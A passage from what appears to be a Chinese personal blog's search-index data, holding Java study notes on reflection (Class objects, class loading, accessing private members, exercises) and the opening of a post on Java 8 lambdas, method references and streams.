cls5 = 基本数据类型.class`\n\n6、基本数据类型对应的包装类，可以通过 .TYPE 得到 Class 类对象\n\n`Class cls6 = 包装类.TYPE`\n\n```java\npackage com.jwt.reflection;\n\npublic class GetClass_ {\n    public static void main(String[] args) throws ClassNotFoundException {\n        //1. Class.forName\n        String classAllPath = \"com.jwt.reflection.Car\"; //通过读取配置文件获取\n        Class<?> cls1 = Class.forName(classAllPath);\n        System.out.println(cls1);\n        //2. 类名.class , 应用场景: 用于参数传递\n        Class cls2 = Car.class;\n        System.out.println(cls2);\n        //3. 对象.getClass(), 应用场景，有对象实例\n        Car car = new Car();\n        Class cls3 = car.getClass();\n        System.out.println(cls3);\n        //4. 通过类加载器【4 种】来获取到类的Class 对象\n        //(1)先得到类加载器car\n        ClassLoader classLoader = car.getClass().getClassLoader();\n        //(2)通过类加载器得到Class 对象\n        Class cls4 = classLoader.loadClass(classAllPath);\n        System.out.println(cls4);\n        //5. 基本数据(int, char,boolean,float,double,byte,long,short) 按如下方式得到Class 类对象\n        Class<Integer> cls5 = int.class;\n        System.out.println(cls5);//int\n        //6. 基本数据类型对应的包装类，可以通过.TYPE 得到Class 类对象\n        Class<Integer> cls6 = Integer.TYPE;\n        System.out.println(cls6);\n    }\n}\n/**\nclass com.jwt.reflection.Car\nclass com.jwt.reflection.Car\nclass com.jwt.reflection.Car\nclass com.jwt.reflection.Car\nint\nint\n**/\n```\n\n### 哪些类型有Class对象\n\n1. 外部类，成员内部类，静态内部类，局部内部类，匿名内部类\n2. interface：接口\n3. 数组\n4. enum：枚举\n5. annotation：注解\n6. 基本数据类型\n7. void\n\n```java\npackage com.jwt.reflection;\n\nimport java.io.Serializable;\n\npublic class AllTypeClass {\n    public static void main(String[] args) {\n        Class<String> aClass1 = String.class;//外部类\n        Class<Serializable> aClass2 = Serializable.class;//接口\n        Class<Integer[]> aClass3 = Integer[].class;//数组\n        Class<Integer[][]> aClass4 = Integer[][].class;//二维数组\n        Class<Deprecated> aClass5 = Deprecated.class;//注解\n        Class<Thread.State> aClass6 = Thread.State.class;//枚举\n        Class<Long> aClass7 = long.class;//基本数据类型\n        Class<Void> aClass8 = void.class;//void数据类型\n        Class<Class> aClass9 = Class.class;//Class类\n\n        System.out.println(aClass1);\n        System.out.println(aClass2);\n        System.out.println(aClass3);\n        System.out.println(aClass4);\n        System.out.println(aClass5);\n        System.out.println(aClass6);\n        System.out.println(aClass7);\n        System.out.println(aClass8);\n        System.out.println(aClass9);\n    }\n}\n```\n\n## 类加载\n\n### 静态加载和动态加载\n\n反射机制是 Java 实现动态语言的关键，也就是通过反射实现类动态加载\n\n- 静态加载：编译时加载相关的类，如果没有则报错\n\n```java\nDog dog = new Dog();\n```\n\n- 动态加载：运行时加载需要的类，编译不报错，降低了依赖性\n\n```java\nClass cls = Class.forName(\"Person\");\nObject o = cls.newInstance();\nMethod method = cls.getMethod(\"hi\");\nmethod.invoke(o);\n```\n\n### 类加载时机\n\n- 当创建对象时（new） //静态加载\n- 当子类被加载时，父类也加载 //静态加载\n- 调用类中的静态成员时 //静态加载\n- 通过反射 //动态加载\n\n### 类加载过程图\n\n![](/Users/jianjian/jwt1399.github.io/source/images/Java-反射/image-20220409132757541.png)\n\n![类加载各阶段完成任务](/Users/jianjian/jwt1399.github.io/source/images/Java-反射/image-20220409132819260.png)\n\n### 类加载五个阶段\n\n#### 1、加载阶段\n\nJVM在改阶段的主要目的是将字节码从不同的数据源（可能是 class 文件、也可能是 jar 包，甚至网络）转化为二进制字节流加载到内存中，并生成一个代表该类的 java.lang.Class 对象\n\n#### 2、连接阶段——验证\n\n- 目的是为了确保 Class 文件的字节流中包含的信息符合当前虚拟机的要求，并且不会危害虚拟机自身的安全。\n- 包括：文件格式验证（是否以魔数 oxcafebabe开头）、元数据验证、字节码验证和符号引用验证。\n- 可以考虑使用 -Xverify:none 参数来关闭大部分的类验证措施，缩短虚拟机类加载的时间。\n\n#### 3、连接阶段——准备\n\nJVM 会在该阶段对**静态变量**，分配内容并初始化（对应数据类型的默认初始值，如0、0L、null、false等）。这些变量所使用的内存都将在方法区中进行分配\n\n```java\nclass A {\n//分析类加载的链接阶段-准备属性是如何处理\n//1. n1 是实例属性, 不是静态变量，因此在准备阶段，是不会分配内存\n//2. n2 是静态变量，分配内存n2 默认初始化0 ,而不是20\n//3. n3 是static final 是常量, 他和静态变量不一样, 因为一旦赋值就不变n3 = 30\npublic int n1 = 10;\npublic static int n2 = 20;\npublic static final int n3 = 30;\n}\n```\n\n#### 4、连接阶段——解析\n\n虚拟机将常量池内的**符号引用**替换为**直接引用**的过程。\n\n#### 5、初始化阶段\n\n到初始化阶段，才真正开始执行类中定义的 Java 程序代码，此阶段是执行\\<clinit>()方法的过程\n\n- \\<clinit>() 方法是由编译器按语句在源文件中出现的顺序，依次自动收集类中的所有静态变量的赋值动作和静态代码块中的语句，并进行合并。\n- 虚拟机会保证一个类的 \\<clinit>() 方法在多线程环境中被正确的加锁、同步，如果多个线程同时去初始化一个类，那么只会有一个线程去执行这个类的 \\<clinit>() 方法，其他线程都需要阻塞等待，直到活动线程执行 \\<clinit>() 方法完毕\n\n## 反射获取类的结构信息\n\n### 1、java.lang.Class类\n\n- getName：获取全类名\n- getSimpleName：获取简单类名\n- getFields：获取所有public修饰的属性，包含本类以及父类的\n- getDeclaredFields：获取本类中所有属性\n- getMethods：获取所有public修饰的方法，包含本类以及父类的\n- getDeclaredMethods：获取本类中所有方法\n- getConstructors：获取所有public修饰的构造器，包含本类以及父类的\n- getDeclaredConstructors：获取本类中所有构造器\n- getPackage：以Package形式返回父类信息\n- getSuperClass：以Class形式返回父类信息\n- getInterfaces：以Class[]形式返回接口信息\n- getAnnotations：以Annotation[]形式返回注解信息\n\n```java\n@Test\npublic void api_01() throws ClassNotFoundException, NoSuchMethodException {\n    //得到Class 对象\n    Class<?> personCls = Class.forName(\"com.jwt.reflection.Person\");\n\n    //getName:获取全类名\n    System.out.println(personCls.getName());//com.hspedu.reflection.Person\n    //getSimpleName:获取简单类名\n    System.out.println(personCls.getSimpleName());//Person\n    //getFields:获取所有public 修饰的属性，包含本类以及父类的\n    Field[] fields = personCls.getFields();\n    for (Field field : fields) {//增强for\n      System.out.println(\"本类以及父类的属性=\" + field.getName());\n    }\n    System.out.println(\"==========================\");\n    //getDeclaredFields:获取本类中所有属性\n    Field[] declaredFields = personCls.getDeclaredFields();\n    for (Field declaredField : declaredFields) {\n      System.out.println(\"本类中所有属性=\" + declaredField.getName());\n    }\n    System.out.println(\"==========================\");\n    //getMethods:获取所有public 修饰的方法，包含本类以及父类的\n    Method[] methods = personCls.getMethods();\n    for (Method method : methods) {\n      System.out.println(\"本类以及父类的方法=\" + method.getName());\n    }\n    System.out.println(\"==========================\");\n    //getDeclaredMethods:获取本类中所有方法\n    Method[] declaredMethods = personCls.getDeclaredMethods();\n    for (Method declaredMethod : declaredMethods) {\n      System.out.println(\"本类中所有方法=\" + declaredMethod.getName());\n    }\n    System.out.println(\"==========================\");\n    //getConstructors: 获取所有public 修饰的构造器，包含本类\n    Constructor<?>[] constructors = personCls.getConstructors();\n    for (Constructor<?> constructor : constructors) {\n      System.out.println(\"本类的构造器=\" + constructor.getName());\n    }\n    System.out.println(\"==========================\");\n    //getDeclaredConstructors:获取本类中所有构造器\n    Constructor<?>[] declaredConstructors = personCls.getDeclaredConstructors();\n    for (Constructor<?> declaredConstructor : declaredConstructors) {\n      System.out.println(\"本类中所有构造器=\" + declaredConstructor.getName());//这里老师只是输出名\n    }\n    System.out.println(\"==========================\");\n    //getPackage:以Package 形式返回包信息\n    System.out.println(personCls.getPackage());//com.hspedu.reflection\n    //getSuperClass:以Class 形式返回父类信息\n    Class<?> superclass = personCls.getSuperclass();\n    System.out.println(\"父类的class 对象=\" + superclass);\n    System.out.println(\"==========================\");\n    //getInterfaces:以Class[]形式返回接口信息\n    Class<?>[] interfaces = personCls.getInterfaces();\n    for (Class<?> anInterface : interfaces) {\n      System.out.println(\"接口信息=\" + anInterface);\n    }\n    System.out.println(\"==========================\");\n    //getAnnotations:以Annotation[] 形式返回注解信息\n    Annotation[] annotations = personCls.getAnnotations();\n    for (Annotation annotation : annotations) {\n      System.out.println(\"注解信息=\" + annotation);//注解\n    }\n}\n/**\ncom.jwt.reflection.Person\nPerson\n本类以及父类的属性=name\n本类以及父类的属性=hobby\n==========================\n本类中所有属性=name\n本类中所有属性=age\n本类中所有属性=job\n本类中所有属性=sal\n==========================\n本类以及父类的方法=m1\n本类以及父类的方法=hi\n本类以及父类的方法=wait\n本类以及父类的方法=wait\n本类以及父类的方法=wait\n本类以及父类的方法=equals\n本类以及父类的方法=toString\n本类以及父类的方法=hashCode\n本类以及父类的方法=getClass\n本类以及父类的方法=notify\n本类以及父类的方法=notifyAll\n==========================\n本类中所有方法=m1\n本类中所有方法=m2\n本类中所有方法=m4\n本类中所有方法=m3\n==========================\n本类的构造器=com.jwt.reflection.Person\n本类的构造器=com.jwt.reflection.Person\n==========================\n本类中所有构造器=com.jwt.reflection.Person\n本类中所有构造器=com.jwt.reflection.Person\n本类中所有构造器=com.jwt.reflection.Person\n==========================\npackage com.jwt.reflection\n父类的class 对象=class com.jwt.reflection.A\n==========================\n接口信息=interface com.jwt.reflection.IA\n接口信息=interface com.jwt.reflection.IB\n==========================\n**/\n```\n\n测试代码\n\n```java\nclass A {\n    public String hobby;\n    public void hi() {}\n    public A() {}\n    public A(String name) {}\n}\n\n\ninterface IA { }\n\ninterface IB { }\n\n@Deprecated\nclass Person extends A implements IA, IB {\n    //属性\n    public String name;\n    protected static int age; // 4 + 8 = 12\n    String job;\n    private double sal;\n    //构造器\n    public Person() {}\n    public Person(String name) {}\n    //私有的\n    private Person(String name, int age) {}\n    //方法\n    public void m1(String name, int age, double sal) {}\n    protected String m2() {\n        return null;\n    }\n    void m3() {}\n    private void m4() {}\n}\n```\n\n### 2、java.lang.reflect.Field类\n\n- getModifiers：以int形式返回修饰符\n  - 说明：默认修饰符是0，public是1，private是2，protected是4，static是8，final是16\n- getType：以Class形式返回类型\n- getName：返回属性名\n\n### 3、java.lang.reflect.Mehod类\n\n- getModifiers：以int形式返回修饰符\n  - 说明：默认修饰符是0，public是1，private是2，protected是4，static是8，final是16\n- getReturnType：以Class形式获取返回类型\n- getName：返回方法名\n- getParameterTypes：以Class[]返回参数类型数组\n\n### 4、java.lang.reflect.Constructor类\n\n- getModifiers：以int形式返回修饰符\n- getName：返回构造器名（全类名）\n- getParameterTypes：以Class[]返回参数类型数组\n\n```java\n@Test\npublic void api_02() throws ClassNotFoundException, NoSuchMethodException {\n  //得到Class 对象\n  Class<?> personCls = Class.forName(\"com.jwt.reflection.Person\");\n  \n  //java.lang.reflect.Field\n  //规定说明: 默认修饰符是0 ， public 是1 ，private 是2 ，protected 是4 , static 是8 ，final 是16\n  Field[] declaredFields = personCls.getDeclaredFields();\n  for (Field declaredField : declaredFields) {\n    System.out.println(\"本类中所有属性=\" + declaredField.getName()\n                       + \" 该属性的修饰符值=\" + declaredField.getModifiers()\n                       + \" 该属性的类型=\" + declaredField.getType()\n                      );\n  }\n  System.out.println(\"==========================\");\n\n  //java.lang.reflect.Mehod\n  Method[] declaredMethods = personCls.getDeclaredMethods();\n  for (Method declaredMethod : declaredMethods) {\n    System.out.println(\"本类中所有方法=\" + declaredMethod.getName()\n                       + \" 该方法的访问修饰符值=\" + declaredMethod.getModifiers()\n                       + \" 该方法返回类型\" + declaredMethod.getReturnType()\n                      );\n  }\n  for (Method declaredMethod : declaredMethods) {\n    //输出当前这个方法的形参数组情况\n    Class<?>[] parameterTypes = declaredMethod.getParameterTypes();\n    for (Class<?> parameterType : parameterTypes) {\n      System.out.println(\"该方法的形参类型=\" + parameterType);\n    }\n  }\n  System.out.println(\"==========================\");\n\n\n  //java.lang.reflect.Constructor\n  Constructor<?>[] declaredConstructors = personCls.getDeclaredConstructors();\n  for (Constructor<?> declaredConstructor : declaredConstructors) {\n    System.out.println(\"本类中所有构造器=\" + declaredConstructor.getName());//只是输出名\n\n  }\n  for (Constructor<?> declaredConstructor : declaredConstructors) {\n    Class<?>[] parameterTypes = declaredConstructor.getParameterTypes();\n    for (Class<?> parameterType : parameterTypes) {\n      System.out.println(\"该构造器的形参类型=\" + parameterType);\n    }\n  }\n}\n/**\n本类中所有属性=name 该属性的修饰符值=1 该属性的类型=class java.lang.String\n本类中所有属性=age 该属性的修饰符值=12 该属性的类型=int\n本类中所有属性=job 该属性的修饰符值=0 该属性的类型=class java.lang.String\n本类中所有属性=sal 该属性的修饰符值=2 该属性的类型=double\n==========================\n本类中所有方法=m1 该方法的访问修饰符值=1 该方法返回类型void\n本类中所有方法=m2 该方法的访问修饰符值=4 该方法返回类型class java.lang.String\n本类中所有方法=m4 该方法的访问修饰符值=2 该方法返回类型void\n本类中所有方法=m3 该方法的访问修饰符值=0 该方法返回类型void\n该方法的形参类型=class java.lang.String\n该方法的形参类型=int\n该方法的形参类型=double\n==========================\n本类中所有构造器=com.jwt.reflection.Person\n本类中所有构造器=com.jwt.reflection.Person\n本类中所有构造器=com.jwt.reflection.Person\n该构造器的形参类型=class java.lang.String\n该构造器的形参类型=int\n该构造器的形参类型=class java.lang.String\n**/\n\n```\n\n## 反射创建对象\n\n- 方式一：调用类中的public修饰的无参构造器创建对象\n- 方式二：调用类中的指定构造器创建对象\n\nClass类相关方法\n\n- newInstance() 调用类中的无参构造器，获取对应类的对象\n- getConstructor(Class..clazz) 根据参数列表，获取对应的public构造器对象\n- getDecalaredConstructor(Class.cazz) 根据参数列表，获取对应的所有构造器对象\n\nConstructor类相关方法\n\n- setAccessible：爆破（形参填入true，即可访问私有构造方法、变量、方法等）\n- newInstance(Object…obj)：调用构造器\n\n```java\npackage com.jwt.reflection;\n\nimport java.lang.reflect.Constructor;\n\npublic class ReflecCreateInstance {\n    public static void main(String[] args) throws Exception {\n        //1. 先获取到User 类的Class 对象\n        Class<?> userClass = Class.forName(\"com.jwt.reflection.User\");\n        //2. 通过public 的无参构造器创建实例\n        Object user1 = userClass.newInstance();\n        System.out.println(user1);\n        //3. 通过public 的有参构造器创建实例\n        //3.1 先得到对应构造器\n        Constructor<?> constructor = userClass.getConstructor(String.class);\n        //3.2 创建实例，并传入实参\n        Object user2 = constructor.newInstance(\"小简\");\n        System.out.println(user2);\n        //4. 通过非public 的有参构造器创建实例\n        //4.1 得到private 的构造器对象\n        Constructor<?> constructor1 = userClass.getDeclaredConstructor(int.class, String.class);\n        //4.2 创建实例\n        //暴破【暴力破解】, 使用反射可以访问private 构造器/方法/属性\n        constructor1.setAccessible(true);\n        Object user3 = constructor1.newInstance(100, \"张三丰\");\n        System.out.println(user3);\n    }\n}\n\n\nclass User {\n    private int age = 10;\n    private String name = \"小明\";\n    public User() {//无参public\n    }\n    public User(String name) {//public 的有参构造器\n        this.name = name;\n    }\n    private User(int age, String name) {//private 有参构造器\n        this.age = age;\n        this.name = name;\n    }\n    @Override\n    public String toString() {\n        return \"User [age=\" + age + \", name=\" + name + \"]\";\n    }\n}\n```\n\n## 反射访问类中的成员\n\n### 访问属性\n\n- 1.根据属性名获取Field对象\n  - `Field f = class对象.getDeclaredField(属性名);`\n- 2.暴破\n  - `f.setAccessible(true); //f是Field`\n- 3.访问\n  - `f.set(o,值);  //o表示对象`\n  - `f.get(o); //o表示对象`\n- 4.注意:如果是静态属性，则set和get中的参数o，可以写成null\n\n```java\npackage com.jwt.reflection;\n\nimport java.lang.reflect.Field;\npublic class ReflecAccessProperty {\n    public static void main(String[] args) throws Exception {\n        //1. 得到Student 类对应的Class 对象\n        Class<?> stuClass = Class.forName(\"com.jwt.reflection.Student\");\n        //2. 创建对象\n        Object o = stuClass.newInstance();//o 的运行类型就是Student\n        System.out.println(o.getClass());//Student\n        System.out.println(o);\n        //3. 使用反射得到age 属性对象\n        Field age = stuClass.getField(\"age\");\n        System.out.println(age.get(o));//返回age 属性的值\n        age.set(o, 88);//通过反射来操作属性\n        System.out.println(o);\n        System.out.println(age.get(o));\n        //4. 使用反射操作name 属性\n        Field name = stuClass.getDeclaredField(\"name\");\n        //对name 进行暴破, 可以操作private 属性\n        name.setAccessible(true);\n        name.set(o, \"小明\");\n        System.out.println(name.get(o)); //获取属性值\n        System.out.println(o);\n        \n        name.set(null, \"小红\");//因为name 是static属性，因此o 也可以用null\n        System.out.println(name.get(null));//获取属性值, 要求name 是static\n        System.out.println(o);\n    }\n}\n\nclass Student {//类\n    public int age;\n    private static String name;\n    public Student() {//构造器\n    }\n    @Override\n    public String toString() {\n        return \"Student [age=\" + age + \", name=\" + name + \"]\";\n    }\n}\n```\n\n### 访问方法\n\n- 1.根据方法名和参数列表获取Method方法对象\n  - `Method m = class对象.getDeclaredMethod(方法名，XX.class);`\n\n- 2.获取对象: `Object o = class对象.newlnstance();`\n- 3.暴破: `m.setAccessible(true);`\n- 4.访问: `Object returnValue = m.invoke(o,实参列表);`\n- 5.注意:如果是静态方法，则invoke的参数o，可以写成null!\n\n```java\npackage com.jwt.reflection;\n\nimport java.lang.reflect.Method;\n\npublic class ReflecAccessMethod {\n    public static void main(String[] args) throws Exception {\n        //1. 得到Boss 类对应的Class 对象\n        Class<?> bossCls = Class.forName(\"com.jwt.reflection.Boss\");\n        //2. 创建对象\n        Object o = bossCls.newInstance();\n        //3. 调用public 的hi 方法\n        //3.1 得到hi 方法对象\n        Method hi = bossCls.getMethod(\"hi\", String.class);//OK\n        //Method hi = bossCls.getDeclaredMethod(\"hi\", String.class);//OK\n        //3.2 调用\n        hi.invoke(o, \"小明\");\n        //4. 调用private static 方法\n        //4.1 得到say 方法对象\n        Method say = bossCls.getDeclaredMethod(\"say\", int.class, String.class, char.class);\n        //4.2 因为say 方法是private, 所以需要暴破，原理和前面讲的构造器和属性一样\n        say.setAccessible(true);\n        System.out.println(say.invoke(o, 100, \"张三\", '男'));\n        //4.3 因为say 方法是static 的，还可以这样调用，可以传入null\n        System.out.println(say.invoke(null, 200, \"李四\", '女'));\n        //5. 在反射中，如果方法有返回值，统一返回Object , 但是他运行类型和方法定义的返回类型一致\n        Object reVal = say.invoke(null, 300, \"王五\", '男');\n        System.out.println(\"reVal 的运行类型=\" + reVal.getClass());//String\n        //在演示一个返回的案例\n        Method m1 = bossCls.getDeclaredMethod(\"m1\");\n        Object reVal2 = m1.invoke(o);\n        System.out.println(\"reVal2 的运行类型=\" + reVal2.getClass());//Monster\n    }\n}\n\nclass Monster {}\nclass Boss {//类\n    public int age;\n    private static String name;\n\n    public Boss() {//构造器\n    }\n\n    public Monster m1() {\n        return new Monster();\n    }\n\n    private static String say(int n, String s, char c) {//静态方法\n        return n + \" \" + s + \" \" + c;\n    }\n\n    public void hi(String s) {//普通public 方法\n        System.out.println(\"hi \" + s);\n    }\n}\n```\n\n## 本章练习\n\n### 练习1 \n\n通过反射修改私有成员变量\n\n- 1.定义 PrivateTest 类， 有私有 name 属性，属性值为 hellokitty\n- 2.提供 getName 的公有方法\n- 3.利用 Class 类得到私有的 name 属性，修改私有的 name 属性值，并调用 getName() 的方法打印 name 属性值\n\n```java\npackage com.jwt.reflection;\n\nimport java.lang.reflect.Field;\nimport java.lang.reflect.InvocationTargetException;\nimport java.lang.reflect.Method;\n\npublic class Homework01 {\n    public static void main(String[] args) throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchFieldException, NoSuchMethodException, InvocationTargetException {\n        Class<?> aClass = Class.forName(\"com.jwt.reflection.PrivateTest\");\n        Object o = aClass.newInstance();\n        Field name =  aClass.getDeclaredField(\"name\");\n        name.setAccessible(true);\n        name.set(o,\"小明\");\n        Method getName = aClass.getMethod(\"getName\");\n        Object returnValue = getName.invoke(o);\n        System.out.println(\"returnValue = \" + returnValue);\n    }\n}\n\nclass PrivateTest{\n    private String name = \"hellokitty\";\n    public String getName() {\n        return name;\n    }\n}\n```\n\n###  练习2\n\n利用反射和 File 完成以下功能\n\n- 1.利用 Class 类的 forName 方法得到 File 类的 class 对象\n- 2.在控制台打印 File 类的所有构造器\n- 3.通过 newInstance 的方法创建 File 对象， 并创建 /Users/jianjian/Downloads/mynew.txt 文件\n- 提示:创建文件的正常写法如下:\n  - File file = new File(\"路径\");\n  - file.createNewFile();\n\n```java\npackage com.jwt.reflection;\n\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.InvocationTargetException;\nimport java.lang.reflect.Method;\n\npublic class Homework02 {\n    public static void main(String[] args) throws Exception, {\n        //得到 File 类的 class 对象\n        Class<?> aClass = Class.forName(\"java.io.File\");\n      \t//打印 File 类的所有构造器\n        Constructor<?>[] declaredConstructors = aClass.getDeclaredConstructors();\n        for (Constructor<?> i:declaredConstructors){\n            System.out.println(\"File构造器 = \" + i);\n        }\n        //指定构造器创建File对象\n        Constructor<?> dc = aClass.getDeclaredConstructor(String.class);\n        Object fileObj = dc.newInstance(\"/Users/jianjian/Downloads/mynew.txt\");\n        //得到createNewFile的方法对象\n        Method createNewFile = aClass.getMethod(\"createNewFile\");\n        createNewFile.invoke(fileObj);\n        System.out.println(\"创建成功\");\n    }\n}\n```\n\n## 参考\n\n- [Java反射详解：入门+使用+原理+应用场景](https://www.cnblogs.com/mikechenshare/p/15796381.html)\n- [Java安全｜反射看这一篇就够了](https://www.freebuf.com/articles/web/325541.html)\n\n## Sponsor\n\n您的支持是我不断前进的动力，如果您恰巧财力雄厚，又感觉本文对您有所帮助的话，可以考虑打赏一下本文，用以维持本博客的运营费用，拒绝白嫖，从你我做起！🥰🥰🥰\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝支付</td>\n         <td style=\"text-align:center;\">微信支付</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["反射"],"categories":["JavaSE"]},{"title":"Java8-新特性","url":"/posts/58320.html","content":"\n## 前言\n\n哈喽！大家好，我是小简。今天开始学习《Java8-新特性》，此系列是我做的一个 “Java 从 0 到 1 ” 实验，给自己一年左右时间，按照我自己总结的 [Java-学习路线](https://jwt1399.top/posts/29829.html)，从 0 开始学 Java 知识，并不定期更新所学笔记，期待一年后的蜕变吧！<有同样想法的小伙伴，可以联系我一起交流学习哦！>\n\n- [x] 🚩时间安排：预计3天更新完\n- [x] 🎯开始时间：04-03\n- [x] 🎉结束时间：04-05\n- [x] 🍀总结：按时完成！\n\n## Lambda表达式\n\n### Lambda\n\n读作`λ`表达式，它其实就是我们接口匿名实现的简化，Lambda 是一个匿名函数，Lambda 允许把函数作为一个方法的参数（函数作为参数传递进方法中）\n\nLambda 表达式的基础语法：Java8 中引入了一个新的操作符 \"`->`\" 该操作符称为箭头操作符或 Lambda 操作符\n\n箭头操作符将 Lambda 表达式拆分成两部分：\n\n- 左侧：Lambda 表达式的参数列表\n\n- 右侧：Lambda 表达式中所需执行的功能， 即 Lambda 体\n\n```java\n语法格式一：无参数，无返回值\n() -> System.out.println(\"Hello Lambda!\");\n\n语法格式二：有一个参数，并且无返回值\n(String x) -> System.out.println(x)\n  \n语法格式三：数据类型可以省略，因为可由编译器推断得出，称为“类型推断”\n(x) -> System.out.println(x)\n\n语法格式四：若只有一个参数，小括号可以省略不写\nx -> System.out.println(x)\n\n语法格式五：有两个以上的参数，有返回值，并且 Lambda 体中有多条语句\nComparator<Integer> com = (x, y) -> {\n  System.out.println(\"函数式接口\");\n  return Integer.compare(x, y);\n};\n\n语法格式六：若 Lambda 体中只有一条语句， return 和大括号都可以省略不写\nComparator<Integer> com = (x, y) -> Integer.compare(x, y);\n```\n\n**从匿名类到 Lambda 的转换**\n\n```java\n@Test\npublic void test(){\n  //匿名内部类\n  Runnable r1 = new Runnable() {\n    @Override\n    public void run() {\n      System.out.println(\"Hello World!\");\n    }\n  };\n  r1.run();\n  \n  //Lambda 表达式\n  Runnable r2 = () -> System.out.println(\"He1lo Lambda!\");\n  r2.run();\n}\n```\n\n**参数传递**\n\n```java\n@Test\npublic void test2(){\n  //原来使用匿名内部类作为参数传递\n  TreeSet<String> ts = new TreeSet<>(new Comparator<String>(){\n    @Override\n    public int compare(String x, String y) {\n      return Integer.compare(x.length(), y.length());\n    }\n  });\n\n  // Lambda表达式作为参数传递\n  Comparator<String> com = (x, y) -> Integer.compare(x.length(), y.length());\n  TreeSet<String> ts2 = new TreeSet<>(com);\n}\n```\n\n### 函数式接口\n\n- Lambda 表达式的本质：作为函数式接口的实例\n- 只包含一个抽象方法的接口，称为函数式接口\n- 函数式接口可以被隐式转换为 Lambda 表达式\n- 我们可以在任意函数式接口上使用 @FunctionalInterface 注解，这样做可以检查它是否是一个函数式接口，同时javadoc 也会包含一条声明，说明这个接口是一个函数式接口。\n\n自定义一个函数式接口\n\n```java\n@FunctionalInterface\ninterface GreetingService \n{\n    void sayMessage(String message);\n}\n```\n\n使用 Lambda 表达式来表示该接口的一个实现(JAVA 8 之前一般是用匿名类实现的)：\n\n```java\nGreetingService greetService1 = message -> System.out.println(\"Hello \" + message);\n```\n\n**Java**内置四大核心函数式接口\n\n| 函数式接口               | 参数类型 | 返回类型 | 用途                                                         |\n| ------------------------ | -------- | -------- | ------------------------------------------------------------ |\n| Consumer\\<T> 消费型接口  | T        | void     | 对类型为T的对象应用操作，包含方法：void accept(T t)          |\n| Supplier\\<T> 供给型接口  | 无       | T        | 返回类型为T的对象，包含方法：T get();                        |\n| Function<T,R> 函数型接口 | T        | R        | 对类型为T的对象应用操作，并返回结果。结果是R类型的对象。包含方法：R apply(T t); |\n| Predicate\\<T> 断定型接口 | T        | boolean  | 确定类型为T的对象是否满足某约束，并返回boolean值。包含方法：boolean test(T t); |\n\n其他函数式接口\n\n| 函数式接口                                                   | 参数类型        | 返回类型        | 用途                                                         |\n| ------------------------------------------------------------ | --------------- | --------------- | ------------------------------------------------------------ |\n| **BiFunction<T,U,R>**                                        | T, U            | R               | 对类型为T,U参数应用操作，返回R类型的结果。包含方法为：Rapply(T t,U u); |\n| **UnaryOperator\\<T>** (Function子接口)                       | T               | T               | 对类型为T的对象进行一元运算，并返回T类型的结果。包含方法为：T apply(T t); |\n| **BinaryOperator\\<T>**(BiFunction子接口)                     | T, T            | T               | 对类型为T的对象进行二元运算，并返回T类型的结果。包含方法为：T apply(T t1,T t2); |\n| **BiConsumer<T,U>**                                          | T, U            | void            | 对类型为T,U参数应用操作。 包含方法为：void accept(T t,U u)   |\n| **BiPredicate<T,U>**                                         | T,U             | boolean         | 包含方法为：boolean test(T t,U u)                            |\n| **ToIntFunction\\<T>** **ToLongFunction\\<T>** **ToDoubleFunction\\<T>** | T               | int long double | 分别计算int、long、double值的函数                            |\n| **IntFunction\\<R>** **LongFunction\\<R>** **DoubleFunction\\<R>** | int long double | R               | 参数分别为int、long、double类型的函数                        |\n\n### 方法引用\n\n- 方法引用本质上就是 Lambda 表达式\n\n- 当要传递给 Lambda 体的操作，已经有实现的方法了，可以使用方法引用 ！\n- 要求：实现接口的抽象方法的参数列表和返回值类型，必须与方法引用的方法的参数列表和返回值类型保持一致！\n- 格式：使用操作符“`::`”将方法名和对象或类的名字分隔开来。\n\n如下三种主要使用情况：\n\n- 对象::实例方法\n\n- 类::静态方法\n\n- 类::实例方法\n\n```java\nConsumer<String> con = (x) -> System.out.println(x);\n//等同于\nConsumer<String> con = System.out::println;\n\n\n//对象的引用::实例方法名\nEmployee emp = new Employee(101, \"张三\", 18, 9999.99);\nSupplier<String> sup = () -> emp.getName();\nSystem.out.println(sup.get());\n//等同于\nSupplier<String> sup2 = emp::getName;\nSystem.out.println(sup2.get());\n\n\n//类名 :: 静态方法名\nComparator<Integer> com = (x,y) -> Integer.compare(x,y);\n//等同于:\nComparator<Integer> com = Integer::compare;\n\n//类名 :: 实例方法名\nBiPredicate<String, String> bp = (x,y) -> x.equals(y);\n//等同于:\nBiPredicate< String,String> bp = String::equals;\n\n//注意:当函数式接口方法的第-一个参数是需要引用方法的调用者，并且第二个参数是需要引用方法的参数(或无参数)时: ClassName::methodName\n```\n\n### 构造器引用\n\n- 与函数式接口相结合，自动与函数式接口中方法兼容。\n\n- 可以把构造器引用赋值给定义的方法\n- 要求：构造器参数列表要与接口中抽象方法的参数列表一致 ！且方法的返回值即为构造器对应类的对象。\n\n- 格式：ClassName::new \n\n```java\nFunction<Integer, MyClass> fun = (n) -> new MyClass(n);\n//等同于:\nFunction<Integer, MyClass> fun = MyClass::new;\n```\n\n### 数组引用\n\n- 格式：type[]::new\n\n```java\nFunction<Integer, Integer[]> fun = (n) -> newInteger[n];\n//等同于\nFunction<Integer, Integer[]> fun = Integer[]::new;\n\nFunction<Integer, String[]> fun = (args) -> new String[args];\nString[] strs = fun.apply(10);\nSystem.out.println(strs.length);\n//等同于\nFunction<Integer, Employee[]> fun2 = Employee[]::new;\nEmployee[] emps = fun2.apply(20);\nSystem.out.println(emps.length);\n```\n\n## Stream API\n\n### Stream 简介\n\n- 流式编程作为 Java 8 的亮点之一，是继 Java 5 之后对集合的再一次升级\n- Stream API 对集合数据进行操作，就类似于使用SQL 执行的数据库查询，Stream API 主要是通过 Lambda 表达式完成。\n- Stream 的工作过程像将一瓶水导入有很多过滤阀的管道一样，水每经过一个过滤阀，便被操作一次，比如过滤，转换等，最后管道的另外一头有一个容器负责接收剩下的水。\n  - 首先通过 source 产生流，然后依次通过一些中间操作，比如过滤，转换，限制等，最后结束对流的操作。\n\n![](https://img.jwt1399.top/img/1363061-20191114111258234-147169035.png)\n\n- Stream 也可以理解为一个更加高级的迭代器，主要的作用便是遍历其中每一个元素。\n- Stram API 